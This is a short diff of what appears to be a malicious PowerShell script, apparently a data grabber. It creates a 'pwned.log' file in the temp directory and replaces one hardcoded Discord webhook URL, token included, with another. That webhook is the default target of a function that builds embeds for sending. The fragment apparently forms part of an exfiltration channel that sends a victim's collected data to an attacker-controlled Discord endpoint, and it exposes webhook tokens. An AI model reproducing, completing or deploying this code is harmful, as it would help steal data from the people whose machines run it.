@@ -1,6 +1,6 @@
  $generateLog = New-Item -Path $env:temp/pwned.log -ItemType File -Force
 
- function Webhook($webhook = 'https://discord.com/api/webhooks/1098249717529444453/iXbi5J66NXPrf9UqE313_-l43UK2sV5VEmzQ4_42vJv-o_eFmAtUyQ15C2iMIV0M3dXV'){
+ function Webhook($webhook = 'https://discord.com/api/webhooks/1099022093452062780/unLiluuQxOl6xNUbxdHmiLmiyJxivbADyriiyTpVKaGMcZD0Ni51MgGSTOlzN-XlkOMe'){
 
 #Create embed array
     [System.Collections.ArrayList]$embedArray = @()
